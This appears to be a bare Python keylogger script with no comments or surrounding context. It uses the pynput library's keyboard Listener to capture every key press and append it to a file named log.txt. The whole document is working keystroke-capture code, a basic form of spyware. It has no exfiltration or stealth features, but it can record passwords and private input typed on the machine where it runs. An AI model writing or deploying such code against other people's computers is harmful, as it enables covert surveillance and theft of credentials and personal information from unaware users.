import pynput

from pynput.keyboard import Key, Listener

def on_press(key):
    pressed_key = str(key)

    f = open("log.txt", "a")
    f.write(pressed_key)


with Listener(on_press=on_press) as listener:
    listener.join()